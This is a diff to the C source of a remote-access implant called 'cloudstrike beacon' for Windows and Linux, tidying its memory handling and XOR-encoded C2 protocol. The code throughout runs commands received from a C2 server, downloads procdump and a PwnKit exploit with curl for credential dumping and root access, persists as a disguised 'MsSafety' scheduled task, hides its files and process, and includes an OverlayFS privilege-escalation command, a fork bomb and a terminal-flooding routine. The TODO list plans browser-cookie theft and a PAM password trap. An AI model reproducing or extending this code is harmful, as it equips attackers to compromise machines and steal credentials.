@@ -1,22 +1,23 @@
 //cloudstrike beacon
 /*
 TODO:
+- optimize code
+- fix chdir code using getcwd and chdir without a fixed PATH_MAX or OLDPWD
 Windows:
 - implement dos function
 - implement history for guid
 - make downloads appear in a folder with guid as name
-- implement communication over https
-- implement communication over dns
+- implement communication over covert channel tls/dns
 - implement check for lolba by checking if the file of the lolba exist
 - implement guid system
 - implement bind shell
 - implement cookie stealer for Firefox, Chrome, Brave, MsEdge, Opera, Opera GX
 - drive encryption functionality
-- better encoding for protocol than xor
+- encryption instead of encoding with xor
 - implement port forwarding or even better socks proxy + proxy chain
 - fix download for bigger files and binaries
 - fix upload for bigger files and binaries
-- replace webserver by uploading files directly over the controll channel
+- replace webserver with uploading files directly over the control channel
 Linux:
 - implement optional pam trap to steal root password
 - add locutus installer
@@ -28,9 +29,9 @@ Linux:
 #define C2_WEB_PORT 1337
 
 
-#define AUTO_IMPLANT 1
+#define AUTO_IMPLANT 0
 
-#define DEBUG 0
+#define DEBUG 1
 
 int got_lolba=0;
 char *magic;
@@ -57,9 +58,23 @@ char HOME[300]="windows";
 
 char init_msg[]="windows\n";
 
+void* realloc_zero(void* pBuffer, size_t oldSize, size_t newSize) {
+  void* pNew = realloc(pBuffer, newSize);
+  if(pNew==NULL) {
+      return(NULL);
+  }
+  if ( newSize > oldSize && pNew ) {
+    size_t diff = newSize - oldSize;
+    void* pStart = ((char*)pNew) + oldSize;
+    memset(pStart, 0, diff);
+  }
+  return pNew;
+}
 
 int _conn_init() {
-    es_init();
+    if(es_init()==-1) {
+        return(-1);
+    }
     while(es_connect(C2_ADDR, C2_PORT)!=0);
     return(0);
 }
@@ -92,19 +107,19 @@ response _recv() {
 
 int _send(char *message) {
     #if DEBUG==1
-    printf("sending '%s'\n", message);//debug
+    printf("sending '%s'\n", message);
     #endif
     #if ENCODED == 1
-        strcat(message, "EOF");
+        memmove(message+strlen(message), "EOF", 4);
         for(int i=0; i<strlen(message); i++) {
             message[i]=message[i]^0x1f;
         }
     #else
         if(strchr(message, '\n')==NULL) {
-            strcat(message, "\n");
+            memmove(message+strlen(message), "\n", 2);
         }
     #endif
-    es_send(message, 1);
+    es_send(message);
     if(!alive()) {
         return(-1);
     }
@@ -143,8 +158,8 @@ char *exec(char *in) {
     #if DEBUG==1
     puts(in);
     #endif
-    char *cmd=malloc(4096);
-    memset(cmd, 0, sizeof(cmd));
+    char *cmd=malloc(strlen("echo %s > C:\\Users\\%%username%%\\co.bat && dxcap -c \'C:\\Users\\%%username%%\\co.bat\' && del C:\\Users\\%%username%%\\co.bat && del C:\\Users\\%%username%%\\co*log")+strlen(in)+1);
+    memset(cmd, 0, strlen("echo %s > C:\\Users\\%%username%%\\co.bat && dxcap -c \'C:\\Users\\%%username%%\\co.bat\' && del C:\\Users\\%%username%%\\co.bat && del C:\\Users\\%%username%%\\co*log")+strlen(in)+1);
     if(got_lolba==1) {
         sprintf(cmd, "echo %s > C:\\Users\\%%username%%\\co.bat && dxcap -c \'C:\\Users\\%%username%%\\co.bat\' && del C:\\Users\\%%username%%\\co.bat && del C:\\Users\\%%username%%\\co*log", in);
     }
@@ -154,34 +169,27 @@ char *exec(char *in) {
     #if DEBUG==1
     printf("executing: %s\n", cmd);
     #endif
-    FILE *t;
-    t=_popen(cmd, "r");
-    if(t==NULL) {
-        char *r=malloc(50);
-        memset(r,0,50);
-        strcpy(r, "error popen failed!\n");
+    FILE *fp;
+    fp=_popen(cmd, "r");
+    if(fp==NULL) {
+        char *r=malloc(strlen("error popen failed!\n")+1);
+        memmove(r, "error popen failed!\n", 21);
         return(r);
     }
-    char *out=malloc(4096);
-    memset(out, 0, sizeof(out));
+
     char *output = malloc(4096);
-    memset(output, 0, sizeof(output));
-    int x=2;
-    while(fgets(output, 4096, t) != NULL) {
-        if (output!=NULL) {
-            sprintf(out, "%s%s", out, output);
-            out=realloc(out, 4096*x);
-            x+=1;
-            memset(output, 0, sizeof(output));
-            if(out==NULL) {
-                char *r=malloc(50);
-                memset(r,0,50);
-                strcpy(r, "error realloc failed!\n");
-                return(r);
-            }
+    int buf_sz=4096;
+    while(1) {
+        char buff[4097]="";
+        int nbytes=fread(buff, 1, 4096, fp);
+        if(nbytes==0) {
+            _pclose(fp);
+            return(output);
         }
+        output=realloc_zero(output, buf_sz, buf_sz+nbytes);
+        buf_sz+=nbytes;
+        memmove(output+strlen(output), buff, nbytes+1);
     }
-    return(out);
 }
 
 
@@ -196,10 +204,10 @@ void destroy() {
 
 
 void passdump() {
-//Load the dump
-//mimikatz # sekurlsa::minidump lsass.dmp(=hello.kitty)
-//Extract credentials
-//mimikatz # sekurlsa::logonPasswords
+    //Load the dump
+    //mimikatz # sekurlsa::minidump lsass.dmp(=hello.kitty)
+    //Extract credentials
+    //mimikatz # sekurlsa::logonPasswords
     char d[1000];
     sprintf(d,"curl %s:%d/%s/procdump.exe -o hello.exe",C2_ADDR, C2_WEB_PORT, magic);
     #if DEBUG==1
@@ -225,7 +233,13 @@ void crash() {
 
 int implant() {
     char* struser = getenv("username");
-    char strnewname[500];
+    char strnewname[500]="";
+    if(strlen(("C:\\Users\\%s\\Safety\\MsSafety.exe")+strlen(struser)) > 500) {
+        #if DEBUG==1
+        printf("implant: error newname to long(>500bytes)!\n");
+        #endif
+        return(-1);
+    }
     sprintf(strnewname, "C:\\Users\\%s\\Safety\\MsSafety.exe", struser);
 
     //char reg1[1024]="reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v MsSafety /t REG_SZ /f /d ";
@@ -247,7 +261,13 @@ int implant() {
     //free(exec(reg3));
     //free(exec(reg4));
 
-    char autorun[500];
+    char autorun[500]="";
+    if(strlen(("schtasks /cr\"ea\"te /f /sc minute /mo 1  /tn \"MsSafety\" /tr %s")+strlen(struser)) > 500) {
+        #if DEBUG==1
+        printf("implant: error newname to long(>500bytes)!\n");
+        #endif
+        return(-1);
+    }
     sprintf(autorun, "schtasks /cr\"ea\"te /f /sc minute /mo 1  /tn \"MsSafety\" /tr %s",strnewname);
     #if DEBUG==1
     puts(autorun);
@@ -268,16 +288,22 @@ int hide(char **argv) {
     #endif
     HWND window;
     AllocConsole();
-    window = FindWindowA("ConsoleWindowClass", NULL); 
+    window = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(window, 0);
     char* struser = getenv("username");
-    char dirname[500];
+    char dirname[500]="";
+    if(strlen("C:\\Users\\%s\\Safety")+strlen(struser)>500) {
+        #if DEBUG==1
+        printf("hide: error newdirname too long (>500 bytes!)\n")
+        #endif
+        return(-1);
+    }
     sprintf(dirname, "C:\\Users\\%s\\Safety", struser);
     CreateDirectory(dirname, NULL);
-    char d[1024];
+    char d[1024]="";
     sprintf(d, "attrib +s +h %s", dirname);
     free(exec(d));
-    char strnewname[300];
+    char strnewname[500]="";
     sprintf(strnewname, "C:\\Users\\%s\\Safety\\MsSafety.exe", struser);
     FILE *ftp;
     ftp=fopen(strnewname, "rb");
@@ -304,9 +330,9 @@ int upload(char *dest) {
         return(-1);
     }
     #if DEBUG==1
-    printf("writing data: %s\n", r1.data);
+    printf("writing data ...\n");
     #endif
-    fputs(r1.data, fp);
+    fwrite(r1.data, r1.buf_sz, 1, fp);
     fclose(fp);
     free(r1.data);
     #if DEBUG==1
@@ -363,9 +389,16 @@ int check_msg(char *msg) {
         return(1);
     }
     else if(strcmp(msg, "panic")==0) {
-        char lol[1000];
+        char lol[1000]="";
         char* struser = getenv("username");
-        char strnewname[300];
+        char strnewname[500]="";
+        if(strlen("C:\\Users\\%s\\Safety\\ms.bat")+strlen(struser)>=500) {
+            #if DEBUG==1
+            printf("panic: error strnewname too long!\n");
+            #endif
+            free(exec("schtasks /de\"let\"e /f /tn MsSafety"));
+            return(2);
+        }
         sprintf(strnewname, "C:\\Users\\%s\\Safety\\ms.bat", struser);
         sprintf(lol,"curl %s:%d/%s/killswitch.bat -o %s",C2_ADDR, C2_WEB_PORT, magic, strnewname);
         puts(lol);
@@ -377,12 +410,18 @@ int check_msg(char *msg) {
     }
     else if(strcmp(msg, "update")==0) {
         char* struser = getenv("username");
-        char strnewname[300];
+        char strnewname[500]="";
+        if(strlen(struser)+strlen("C:\\Users\\%s\\Safety\\MsSafety.exe")>=500) {
+            #if DEBUG==1
+            printf("update: error struser to big!\n");
+            #endif
+            return(0);
+        }
         sprintf(strnewname, "C:\\Users\\%s\\Safety\\MsSafety.exe", struser);
-        char strnewername[400];
+        char strnewername[500]="";
         sprintf(strnewername, "C:\\Users\\%s\\Safety\\MsSafety2.exe", struser);
         rename(strnewname, strnewername);
-        char d[1000];
+        char d[1000]="";
         sprintf(d,"curl %s:%d/%s/beacon_global.exe -o %s",C2_ADDR, C2_WEB_PORT, magic, strnewname);
         free(exec(d));
         char info[50]="update finished!";
@@ -391,9 +430,9 @@ int check_msg(char *msg) {
     }
     else if(strcmp(msg, "pyinstall")==0) {
         char* struser = getenv("username");
-        char oname[300];
+        char oname[300]="";
         sprintf(oname, "C:\\Users\\%s\\Safety\\python-3.8.5.exe", struser);
-        char d[1000];
+        char d[1000]="";
         sprintf(d, "curl %s:%d/%s/python-3.8.5.exe --output \"%s\" && \"%s\" InstallAllUsers=0 Include_launcher=0 Include_test=0 PrependPath=1 /quiet", C2_ADDR, C2_WEB_PORT, magic, oname, oname);
         #if DEBUG==1
         puts(d);
@@ -432,8 +471,8 @@ int check_msg(char *msg) {
         return(1);
     }
     else if(strstr(msg, "upload")!=NULL) {
-        char msg2[s+1];
-        strcpy(msg2, msg);
+        char msg2[s+1]="";
+        memmove(msg2, msg, s+1);
         #if DEBUG==1
         puts("\n");
         puts(msg2);
@@ -463,8 +502,8 @@ int check_msg(char *msg) {
         return(1);
     }
     else if(strstr(msg, "download")!=NULL) {
-        char msg2[s+1];
-        strcpy(msg2, msg);
+        char msg2[s+1]="";
+        memmove(msg2, msg, s+1);
         #if DEBUG==1
         puts("\n");
         puts(msg2);
@@ -528,6 +567,20 @@ char init_msg[]="linux\n";
 int sock;
 struct sockaddr_in server;
 
+void* realloc_zero(void* pBuffer, size_t oldSize, size_t newSize) {
+  void* pNew = realloc(pBuffer, newSize);
+  if(pNew==NULL) {
+      return(NULL);
+  }
+  if ( newSize > oldSize && pNew ) {
+    size_t diff = newSize - oldSize;
+    void* pStart = ((char*)pNew) + oldSize;
+    memset(pStart, 0, diff);
+  }
+  return pNew;
+}
+
+
 int _conn_init() {
     sock=socket(AF_INET, SOCK_STREAM, 0);
     if(sock==-1) {
@@ -551,18 +604,40 @@ int _conn_init() {
 
 int _send(char *message) {
     #if ENCODED==1
-        strcat(message, "EOF");
-        for(int i=0; i<strlen(message); i++) {
-            message[i]=message[i]^0x1f;
+        char *data=malloc(strlen(message)+4); //allocate space for eof
+        memmove(data, message, strlen(message)+1);
+        memmove(data+strlen(message), "EOF", 4);
+        for(int i=0; i<strlen(data); i++) {
+            data[i]=data[i]^0x1f;
         }
     #endif
-    return(send(sock, message, strlen(message), 0));
+    int r=send(sock, data, strlen(data), 0);
+    free(data);
+    return(r);
+}
+
+int contains_eof(char *str, char *eof) {
+    for(char *ptr=str;*ptr!='\0';ptr++) {
+        if(strcmp(ptr, eof)==0) {
+            return(1);
+        }
+    }
+    return(0);
 }
 
 response _recv() {
     response r;
-    char *message=malloc(4096);
-    memset(message, 0, 4096);
+    ssize_t rcv_r;
+    char *rep=malloc(4096);
+    if(rep==NULL) {
+        #if DEBUG==1
+        printf("_recv: error failed to allocate memory for rep!\n");
+        #endif
+        r.data="_recv: error failed to allocate memory for rep!\n";
+        r.buf_sz=0;
+        return(r);
+    }
+    memset(rep, 0, 4096);
     #if ENCODED==1
         char eof[4]={'E'^0x1f, 'O'^0x1f, 'F'^0x1f, '\0'};
     #else
@@ -571,41 +646,52 @@ response _recv() {
     #if DEBUG==1
     puts("receiving...\n");
     #endif
-    char *tmp=malloc(4096);
-    while(recv(sock, tmp, 4096, 0)>0) {
-        message=realloc(message, strlen(message)+strlen(tmp)+2);
-        if(message==NULL) {
+
+    unsigned int buf_sz=4096+1;
+    while((rcv_r=recv(sock, rep, 4096, 0))>0) {
+        if(rcv_r==-1) {
+            #if DEBUG==1
+            printf("_recv: error failed to receive message!\n");
+            #endif
+            r.data="_recv: error failed to receive message!\n";
+            r.buf_sz=0;
+            return(r);
+        }
+        rep=realloc_zero(rep, buf_sz, buf_sz+rcv_r);
+        if(rep==NULL) {
             #if DEBUG==1
             printf("error realloc failed!\n");
             #endif
+            r.data="error realloc failed!\n",
             r.buf_sz=0;
-            strcpy(r.data, "error realloc failed!");
             return(r);
         }
         #if DEBUG==1
-        printf("tmp: '%s'\n", tmp);
+        printf("current message (recv): '%s'\n", rep);
         #endif
-        strcat(message, tmp);
-        #if DEBUG==1
-        printf("current message: '%s'\n", message);
-        #endif
-        if(strstr(tmp, eof)!=NULL) {
+
+        if(contains_eof(rep, eof)) {
             #if DEBUG==1
             puts("EOF found!\n");
             #endif
-            break;
+            if(ENCODED==1) {
+                for(int i=0; i<strlen(rep); i++) {
+                    rep[i]=rep[i]^0x1f;
+                }
+                rep[strlen(rep)-4]='\0';
+            }
+            response r;
+            r.data=rep;
+            r.buf_sz=buf_sz;
+            #if DEBUG==1
+            printf("current message (recv dec): %s\n", r.data);
+            #endif
+            return(r);
         }
-        memset(tmp, 0, 4096);
+
     }
-    free(tmp);
-    if(ENCODED==1) {
-        for(int i=0; i<strlen(message); i++) {
-            message[i]=message[i]^0x1f;
-        }
-        message[strlen(message)-4]='\0';
-    }
-    r.buf_sz=strlen(message);
-    r.data=message;
+    r.data="recv failed as socket died!\n";
+    r.buf_sz=0;
     return(r);
 }
 
@@ -614,6 +700,7 @@ int _cleanup() {
     printf("cleaning up...\n");
     #endif
     close(sock);
+    return(0);
 }
 
 time_t getFileCreationTime(char *path) {
@@ -635,54 +722,60 @@ void change_time(char *filename, time_t new) {
 }
 
 
+
 char *exec(char *cmd) {
     #if DEBUG==1
     printf("executing: %s\n", cmd);
     #endif
     FILE *fp;
-    fp=popen(cmd, "r");
-    if(fp==NULL) {
-        char *err=malloc(50);
-        memset(err, 0, 50);
-        strcpy(err, "error popen failed!\n");
-        return(err);
-    }
-    char *out=malloc(1024);
-    memset(out, 0, 1024);
-    char *output = malloc(1024);
-    memset(output, 0, 1024);
-    while(fgets(output, 1024, fp) != NULL) {
-        if (output==NULL) {
-            #if DEBUG==1
-            printf("error malloc failed!\n");
-            #endif
-            char *err=malloc(50);
-            memset(err, 0, 50);
-            strcpy(err, "error malloc failed!\n");
-            return(err);
+    fp = popen(cmd, "r");
+    if (fp == NULL) {
+        char *err = malloc(50);
+        if (err == NULL) {
+            return NULL;
         }
-        out=realloc(out, strlen(out)+strlen(output)+2);
-        sprintf(out, "%s%s", out, output);
+        memmove(err, "error popen failed!\n", 21);
+        return err;
     }
-    #if DEBUG==1
-    printf("exec out: %s\n", out);
-    #endif
-    if(output!=NULL) {
-        free(output);
+
+    char *output = malloc(4097);
+    if (output == NULL) {
+        pclose(fp);
+        return NULL;
     }
-    else {
+    memset(output, 0, 4097);
+    int buf_sz = 4097;
+    while (1) {
+        char buff[4097] = "";
+        size_t nbytes = fread(buff, 1, 4096, fp);
         #if DEBUG==1
-        printf("error output is null!\n");
+        printf("exec: read %zu bytes from fp!\n", nbytes);
+        size_t sb = strlen(buff);
+        printf("exec: strlen(buff)=%zu\n", sb);
         #endif
+        if (nbytes == 0) {
+            if (feof(fp)) {
+                pclose(fp);
+                return output;
+            }
+            if (ferror(fp)) {
+                free(output);
+                pclose(fp);
+                return NULL;
+            }
+        }
+        char *new_output = realloc_zero(output, buf_sz, buf_sz + nbytes);
+        if (new_output == NULL) {
+            free(output);
+            pclose(fp);
+            return NULL;
+        }
+        output = new_output;
+        buf_sz += nbytes;
+        memmove(output+strlen(output), buff, nbytes+1);
     }
-    if(out==NULL) {
-        char *err=malloc(50);
-        memset(err, 0, 50);
-        strcpy(err, "error out is null!");
-        return(err);
-    }
-    return(out);
 }
+
 
 int hide(char **argv) {
     #if DEBUG==1
@@ -707,11 +800,11 @@ int hide(char **argv) {
         free(exec("mv /tmp/mtab /etc/mtab"));
         free(exec("cp /etc/mtab /tmp/mtab"));
         pid_t pid=getpid();
-        char pidstr[10];
+        char pidstr[30]="";
         sprintf(pidstr, "%d", pid);
-        char *dest=malloc(strlen(pidstr)+strlen("/proc/")+2);
-        strcpy(dest, "/proc/");
-        strcat(dest, pidstr);
+        char *dest=malloc(strlen(pidstr)+strlen("/proc/")+1);
+        memmove(dest, "/proc", 6);
+        memmove(dest+strlen(dest), pidstr, strlen(pidstr)+1);
         mount("/bin", dest, "none", MS_BIND, NULL);
         free(dest);
         free(exec("mv /tmp/mtab /etc/mtab"));
@@ -719,6 +812,7 @@ int hide(char **argv) {
     else {
         unlink(argv[0]);
     }
+    return(0);
 }
 
 int pwnkit() {
@@ -733,7 +827,7 @@ int pwnkit() {
         return(-1);
     }
     else{
-        char cmd[4096];
+        char cmd[4096]="";
         sprintf(cmd, "curl %s:%d/%s/PwnKite.py -o /tmp/PwnKite.py", C2_ADDR, C2_WEB_PORT, magic);
         free(exec(cmd));
         char ret[] = "PwnKit downloaded to /tmp/PwnKite.py!";
@@ -773,9 +867,9 @@ int upload(char *dest) {
         return(-1);
     }
     #if DEBUG==1
-    printf("writing data: %s\n", r1.data);
+    printf("writing data ...\n");
     #endif
-    fputs(r1.data, fp);
+    fwrite(r1.data, r1.buf_sz, 1, fp);
     fclose(fp);
     free(r1.data);
     #if DEBUG==1
@@ -785,32 +879,39 @@ int upload(char *dest) {
 }
 
 int download(char *filename) {
-    FILE *fp=fopen(filename, "r");
-    if(fp==NULL) {
+    FILE *fp = fopen(filename, "rb");
+    if (fp == NULL) {
+        perror("Error opening file");
         return(-1);
     }
     fseek(fp, 0, SEEK_END);
-    long fsize=ftell(fp);
+    long fsize = ftell(fp);
     fseek(fp, 0, SEEK_SET);
-    char *content=malloc(fsize+1);
-    if(content==NULL) {
+    char *content = malloc(fsize + 1);
+    if (content == NULL) {
         fclose(fp);
+        perror("Error allocating memory");
         return(-1);
     }
-    memset(content, 0, fsize+1);
-    fread(content, fsize, 1, fp);
+    memset(content, 0, fsize + 1);
+    if (fread(content, fsize, 1, fp) != 1) {
+        fclose(fp);
+        free(content);
+        perror("Error reading file");
+        return(-1);
+    }
     fclose(fp);
     _send(content);
+    free(content);
     return(1);
 }
-
 
 int game_overlay() {
     dup2(sock, 0);
     dup2(sock, 1);
     dup2(sock, 2);
     char command[]="unshare -rm sh -c \"mkdir l u w m;cp /bin/sh l/;setcap cap_setuid+eip l/sh;mount -t overlay overlay -o userxattr,rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;u/sh;\"";
-    char ms[500];
+    char ms[500]="";
     sprintf(ms, "run to get root:\n%s\n\n", command);
     if(_send(ms)==0) {
         #if DEBUG==1
@@ -849,17 +950,19 @@ int implant() {
 }
 
 int rootkit() {
-
+    return(0);
 }
 
 int crash() {
     while (1) {
         fork();
     }
+    return(0);
 }
 
 int break_shells() {
     exec("for i in $(seq 0 10);do cat /dev/urandom > /dev/pts/$i &done");
+    return(0);
 }
 
 int nyan() {
@@ -876,7 +979,7 @@ int nyan() {
             return(-1);
         }
     }
-    char cmd_[4096];
+    char cmd_[4096]="";
     sprintf(cmd_, "curl %s:%d/%s/nyancat -o /tmp/nyanrner", C2_ADDR, C2_WEB_PORT, magic);
     free(exec(cmd_));
     free(exec("chmod +x /tmp/nyanrner"));
@@ -926,7 +1029,7 @@ int check_msg(char *msg) {
     }
     else if(strstr(msg, "upload")!=NULL) {
         char msg2[s+1];
-        strcpy(msg2, msg);
+        memmove(msg2, msg, s+1);
         #if DEBUG==1
         puts("\n");
         puts(msg2);
@@ -957,7 +1060,7 @@ int check_msg(char *msg) {
     }
     else if(strstr(msg, "download")!=NULL) {
         char msg2[s+1];
-        strcpy(msg2, msg);
+        memmove(msg2, msg, s+1);
         #if DEBUG==1
         puts("\n");
         puts(msg2);
@@ -1071,7 +1174,14 @@ int main(int argc, char **argv)
         fclose(ftp);
     }
     char* struser = getenv("username");
-    sprintf(HOME, "C:\\Users\\%s\\", struser);
+    if(strlen(struser)<300) {
+        sprintf(HOME, "C:\\Users\\%s\\", struser);
+    }
+    #if DEBUG==1
+    else {
+        printf("error HOME dir bigger than 300bytes!\n");
+    }
+    #endif
     #endif
 
     if(_conn_init()!=0) {
@@ -1100,14 +1210,19 @@ int main(int argc, char **argv)
     #endif
     response r_m;
     r_m=_recv();
+    #if DEBUG==1
+    if(r_m.buf_sz==0) {
+        printf("error when receiving magic string: %s\n", r_m.data);
+        return(-1);
+    }
+    #endif
     magic=r_m.data;
     #if DEBUG==1
     printf("\nmagic: %s\n", magic);
     #endif
-    char PWD[5000];
-    char OLDPWD[5000];
-    strcpy(PWD, HOME);
-    strcpy(OLDPWD, "");
+    char PWD[5000]="";
+    char OLDPWD[5000]="";
+    memmove(PWD, HOME, strlen(HOME));
     #if DEBUG==1
     puts(PWD); //debug
     puts(OLDPWD);//debug
@@ -1115,7 +1230,7 @@ int main(int argc, char **argv)
     int no=0;
     while(1) {
         no=0;
-        int r_p;
+        int r_p=1;
         if(strcmp(PWD, OLDPWD)!=0) {
             #if DEBUG==1
             printf("chdir because: %s!=%s\n", PWD, OLDPWD); //debug
@@ -1130,19 +1245,20 @@ int main(int argc, char **argv)
                 #if DEBUG==1
                 printf("chdir to %s failed!\n", PWD);
                 #endif
-                char msg_[5021];
+                char msg_[5021]="";
                 sprintf(msg_, "cannot cd to %s\n%s\n", PWD, strerror(errno));
                 #if DEBUG==1
                 puts(msg_);
                 #endif
                 _send(msg_);
                 chdir(HOME);
-                strcpy(PWD, HOME);
-                strcpy(OLDPWD, HOME);
+                memmove(PWD, HOME, strlen(HOME));
+                memmove(OLDPWD, HOME, strlen(HOME));
             }
         }
         else {
-            strcpy(OLDPWD, PWD);
+            PWD[4999]='\0';
+            memmove(OLDPWD, PWD, strlen(PWD));
         }
         response r_msg;
         r_msg=_recv();
@@ -1157,38 +1273,30 @@ int main(int argc, char **argv)
         #if DEBUG==1
         printf("msg in main: %s\n", msg);
         #endif
-        if(r_msg.buf_sz>5000) {
-            _send("buffer overflow attempt!!!\n");
-            #if DEBUG==1
-            printf("buffer overflow attempt!!!\n");
-            #endif
-            _cleanup();
-            return(-1);
-        }
         char bak[r_msg.buf_sz+1];
-        memset(bak, 0, r_msg.buf_sz+1);
-        strcpy(bak, msg);
+        memmove(bak, msg, r_msg.buf_sz+1);
         #if DEBUG==1
         printf("bak: %s\n", bak);
         #endif
-        if(strlen(bak)>2 && bak[0]=='c' && bak[1]=='d') {
+        if(strlen(bak)>3 && bak[0]=='c' && bak[1]=='d') {
             char *tok=strtok(bak, " ");
             #if DEBUG==1
             printf("tok: %s\n", tok);
             #endif
-            strcpy(OLDPWD, PWD);
-            strcpy(PWD, "");
+            memmove(OLDPWD, PWD, strlen(PWD));
+            OLDPWD[4999]='\0';
+            PWD[0]='\0';
             int pl=0;
             if(tok!=NULL) {
                 while(tok!=NULL) {
                     tok=strtok(NULL, " ");
                     if(tok!=NULL) {
                         if(pl>0) {
-                            strcat(PWD, " ");
+                            memmove(PWD+strlen(PWD), " ", 2);
                         }
                         pl+=strlen(tok);
                         if(pl<4000) {
-                            strcat(PWD, tok);
+                            memmove(PWD+strlen(PWD), tok, strlen(tok)+1);
                             #if DEBUG==1
                             printf("MAX PATH EXCEEDED: cutting for chdir!\n");
                             #endif
